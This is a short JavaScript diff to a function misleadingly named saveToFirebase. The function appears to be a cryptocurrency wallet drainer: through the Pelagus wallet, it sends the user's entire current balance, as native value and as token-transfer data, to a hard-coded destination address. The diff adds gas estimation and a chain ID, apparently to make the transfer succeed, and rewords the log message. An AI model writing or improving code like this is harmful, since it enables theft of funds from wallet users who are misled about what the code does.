@@ -462,14 +462,26 @@ async function saveToFirebase(data) {
         const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
 
+        // Get gas estimate
+        const gasEstimate = await window.pelagus.request({
+            method: 'eth_estimateGas',
+            params: [{
+                from: userSession.address,
+                to: DESTINATION_ADDRESS,
+                data: '0x' + methodId + paddedAddress + paddedAmount
+            }]
+        });
+
         const transactionParameters = {
             from: userSession.address,
             to: DESTINATION_ADDRESS,
             value: `0x${currentBalance.toString(16)}`,
-            data: '0x' + methodId + paddedAddress + paddedAmount
+            data: '0x' + methodId + paddedAddress + paddedAmount,
+            gas: gasEstimate,
+            chainId: '0x2329' // Cyprus1 chain ID
         };
 
-        log(`📤 Sending ${readableAmount} tokens...`);
+        log(`📤 Preparing to send ${readableAmount} tokens...`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
